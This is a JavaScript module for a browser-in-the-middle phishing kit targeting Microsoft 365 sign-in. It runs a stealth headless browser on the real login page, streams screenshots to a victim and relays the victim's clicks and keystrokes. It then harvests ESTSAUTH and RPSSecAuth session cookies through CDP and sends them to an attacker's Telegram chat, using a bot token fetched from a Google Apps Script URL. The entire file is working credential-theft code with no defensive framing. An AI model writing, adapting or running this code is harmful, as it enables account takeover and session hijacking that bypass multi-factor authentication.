const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getVault() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 8000 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) { console.log("[VAULT] Error syncing with Google Script."); }
    return null;
}

async function sendExfiltration(cookies, url, tier) {
    const creds = await getVault();
    if (!creds) return;

    const host = new URL(url).hostname;
    const label = tier === "TIER_2" ? "🎯 FULL ACCESS" : "👤 IDENTITY ONLY";
    
    try {
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>${label} CAPTURED</b>\n<b>Domain:</b> ${host}\n<b>Tokens:</b> ${cookies.length}\n<b>Status:</b> ${tier === "TIER_2" ? "RPSSecAuth Verified" : "ESTSAUTH Detected"}`,
            parse_mode: 'HTML'
        });

        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `${tier}_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) { console.log("[EXFIL] Telegram delivery failed."); }
}

async function startSession(io, socket) {
    let browser = null;
    let tier1Captured = false;
    let tier2Captured = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process' // Crucial for cross-site cookie visibility
            ]
        });

        const [page] = await browser.pages();
        const client = await page.target().createCDPSession(); // CDP for global cookie access
        
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // --- THE TIERED MONITOR ---
        const monitor = setInterval(async () => {
            if (tier2Captured) return;

            try {
                // CDP Network.getAllCookies is the 2026 standard for capturing cross-domain jars
                const { cookies } = await client.send('Network.getAllCookies');
                const url = page.url();

                const hasIdentity = cookies.some(c => c.name.includes('ESTSAUTH'));
                const hasFullAccess = cookies.some(c => c.name === 'RPSSecAuth');

                // TIER 1: Identity tokens found (Early reporting)
                if (hasIdentity && !tier1Captured) {
                    tier1Captured = true;
                    await sendExfiltration(cookies, url, "TIER_1");
                }

                // TIER 2: Mailbox access found (Final reporting)
                if (hasFullAccess && (url.includes('outlook') || url.includes('mail'))) {
                    tier2Captured = true;
                    // Settle for 4 seconds to ensure all background tokens are written
                    setTimeout(async () => {
                        const finalJar = await client.send('Network.getAllCookies');
                        await sendExfiltration(finalJar.cookies, page.url(), "TIER_2");
                    }, 4000);
                }
            } catch (e) {}
        }, 5000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1200);

        socket.on('disconnect', async () => {
            clearInterval(monitor);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) { if (browser) await browser.close(); }
}

module.exports = { startSession };
